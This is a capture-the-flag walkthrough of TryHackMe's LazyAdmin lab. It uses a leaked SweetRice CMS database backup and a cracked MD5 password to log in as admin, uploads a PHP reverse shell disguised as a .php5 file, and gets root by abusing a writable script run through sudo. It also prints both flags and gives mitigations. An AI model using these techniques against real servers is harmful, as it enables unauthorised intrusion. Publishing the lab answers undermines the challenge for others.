# LazyAdmin CTF Walkthrough

**Target:** LazyAdmin  
**Source:** [TryHackMe](https://tryhackme.com/room/lazyadmin)  
**Difficulty:** Easy  
**Target IP:** 10.113.152.250

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Database Backup Disclosure](#database-backup-disclosure)
- [SweetRice Admin Access](#sweetrice-admin-access)
- [Reverse Shell Upload](#reverse-shell-upload)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

LazyAdmin is an easy Linux box centred on a vulnerable SweetRice CMS
installation. The objective is to gain a foothold on the system and escalate to
root, capturing both the user and root flags. The attack chain covers directory
enumeration to discover the CMS, recovery of a MySQL backup leaking admin
credentials, an MD5 password crack, an authenticated file upload for a reverse
shell, and a `sudo` misconfiguration on a writable Perl-invoked script for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory enumeration with Gobuster
- Sensitive file discovery and credential recovery
- MD5 hash cracking
- Authenticated file-upload reverse shell
- Linux privilege escalation via writable `sudo` script

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.113.152.250
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |

A more aggressive scan confirms the versions and the default Apache landing page:

```bash
nmap -A -T4 -Pn 10.113.152.250
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Two ports are open: SSH and an Apache web server serving the default Ubuntu
page. The web server is the obvious starting point.

---

## Web Enumeration

### Top-Level Directory Brute Force

The default Apache page hides the real application, so Gobuster is used to
enumerate directories:

```bash
gobuster dir -u http://10.113.152.250 -w /usr/share/wordlists/dirb/big.txt
```

```
.htpasswd            (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
content              (Status: 301) [Size: 318] [--> http://10.113.152.250/content/]
server-status        (Status: 403) [Size: 279]
```

The `/content/` directory is the lead. A deeper scan with extensions enumerates
its structure:

```bash
gobuster dir -u http://10.113.152.250/content -w /usr/share/wordlists/dirb/common.txt -x html,txt
```

```
_themes              (Status: 301) [--> .../content/_themes/]
as                   (Status: 301) [--> .../content/as/]
attachment           (Status: 301) [--> .../content/attachment/]
changelog.txt        (Status: 200) [Size: 18013]
images               (Status: 301) [--> .../content/images/]
inc                  (Status: 301) [--> .../content/inc/]
index.php            (Status: 200) [Size: 2200]
js                   (Status: 301) [--> .../content/js/]
license.txt          (Status: 200) [Size: 15410]
```

Browsing to `/content/as/` reveals a **SweetRice CMS** admin login panel.

> **Application:** SweetRice CMS at `/content/as/`

---

## Database Backup Disclosure

The `/content/inc/` path contains a MySQL backup directory. The exposed `.sql`
dump is pulled down directly:

```bash
curl -O http://10.113.152.250/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
cat mysql_bakup_20191129023059-1.5.1.sql
```

The dump leaks the admin username and a hashed password:

```
username: manager
password Hash: 42f749ade7f9e195bf475f37a44cafcb
```

The MD5 hash is cracked using CrackStation:

```
42f749ade7f9e195bf475f37a44cafcb  ->  md5  ->  Password123
```

> **Recovered credentials:** `manager : Password123`

---

## SweetRice Admin Access

The cracked credentials authenticate against the SweetRice admin panel:

```
http://10.113.152.250/content/as/   ->   manager : Password123
```

With admin access, SweetRice's media upload feature can be abused to plant a PHP
reverse shell.

---

## Reverse Shell Upload

A standard PHP reverse shell is prepared and renamed to bypass the upload
filter (SweetRice blocks `.php` but allows `.php5`):

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
nano php-reverse-shell.php
```

```php
$ip   = '<your_ip>';   // listener IP
$port = 9090;          // listener port
```

```bash
mv php-reverse-shell.php shell.php5
```

The file is uploaded through the media center endpoint:

```
http://10.113.152.250/content/as/?type=media_center
```

A netcat listener is started before triggering the shell:

```bash
rlwrap nc -nvlp 9090
```

```
listening on [any] 9090 ...
connect to [192.168.132.9] from (UNKNOWN) [10.113.152.250]
Linux THM-Chal 4.15.0-70-generic ... i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to a fully interactive TTY:

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@THM-Chal:/$ export TERM=xterm
```

> **Foothold:** `www-data`

---

## User Flag

The user flag sits in the `itguy` home directory:

```bash
www-data@THM-Chal:/$ cd /home/itguy
www-data@THM-Chal:/home/itguy$ ls
Desktop  Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music    Public    Videos     examples.desktop  user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

> **User flag:** `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## Privilege Escalation

Checking `sudo` privileges reveals `www-data` may run a Perl script as root
without a password:

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Inspecting the script shows it simply executes another shell script:

```bash
www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

`/etc/copy.sh` is world-writable, so its contents can be replaced with an
interactive shell payload. Running the sudo-allowed Perl script then executes
that payload as root:

```bash
www-data@THM-Chal:/home/itguy$ echo "/bin/bash -i" > /etc/copy.sh
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/home/itguy# whoami
root
```

The root flag is then read directly:

```bash
root@THM-Chal:/home/itguy# cd /root
root@THM-Chal:~# ls
root.txt
root@THM-Chal:~# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

> **Root flag:** `THM{6637f41d0177b6f37cb20d775124699f}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{63e5bce9271952aad1113b6f1ac28a07}` | `/home/itguy/user.txt` |
| Root flag | `THM{6637f41d0177b6f37cb20d775124699f}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Exposed MySQL Backup with Credentials (Critical)

**Description:** A MySQL database backup (`mysql_bakup_20191129023059-1.5.1.sql`)
was left in the publicly accessible `/content/inc/mysql_backup/` directory,
disclosing the admin username (`manager`) and an MD5 password hash.

**Impact:** The admin credentials were recovered directly from the web root,
giving an attacker control of the CMS.

**Mitigation:**
- Never store database backups within the web root or any publicly served path.
- Restrict access to backup directories and remove backups after use.

### 2. Weak / Crackable Password Hash (High)

**Description:** The admin password was stored as an unsalted MD5 hash
(`Password123`), trivially reversed via an online lookup service.

**Impact:** Full admin access to the SweetRice CMS.

**Mitigation:**
- Use strong, salted password hashing algorithms (bcrypt, Argon2).
- Enforce strong, unique passwords.

### 3. Unrestricted File Upload (High)

**Description:** The SweetRice media center allowed uploading a `.php5` file that
the server executed as PHP, enabling a reverse shell.

**Impact:** Remote code execution as `www-data`.

**Mitigation:**
- Validate uploads by content, enforce an allow-list of safe extensions, and
  prevent execution of uploaded files.
- Keep the CMS patched and updated.

### 4. Sudo Misconfiguration — Writable Script (Critical)

**Description:** `www-data` could run `/usr/bin/perl /home/itguy/backup.pl` as
root with `NOPASSWD`, and the script's target (`/etc/copy.sh`) was world-writable,
allowing arbitrary root command execution.

**Impact:** Full privilege escalation from `www-data` to `root`.

**Mitigation:**
- Apply least privilege in `sudoers`; never grant `sudo` on scripts that invoke
  writable files.
- Ensure any script run with elevated privileges and its dependencies are owned
  by root and not writable by lower-privileged users.

---

## Attack Chain Summary

```
Nmap scan → 2 open ports (SSH, HTTP)
    ↓
Gobuster → /content/ → SweetRice CMS at /content/as/
    ↓
Exposed MySQL backup → manager : 42f749...cafcb (MD5)
    ↓
CrackStation → Password123
    ↓
SweetRice admin login (manager : Password123)
    ↓
Upload shell.php5 via media_center → reverse shell
    ↓
Foothold as www-data
    ↓
User flag: THM{63e5bce9271952aad1113b6f1ac28a07} (/home/itguy/user.txt)
    ↓
sudo -l → (ALL) NOPASSWD: perl /home/itguy/backup.pl → runs /etc/copy.sh
    ↓
echo "/bin/bash -i" > /etc/copy.sh → sudo perl backup.pl → root shell
    ↓
Root flag: THM{6637f41d0177b6f37cb20d775124699f} (/root/root.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster | Web directory enumeration |
| curl | Backup file retrieval |
| CrackStation | MD5 hash cracking |
| php-reverse-shell | Reverse shell payload |
| netcat / rlwrap | Reverse shell listener |
| Perl / sudo | Privilege escalation |

---

## References

- [TryHackMe — LazyAdmin](https://tryhackme.com/room/lazyadmin)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [CrackStation](https://crackstation.net/)
- [SweetRice CMS](http://www.basic-cms.org/)

---
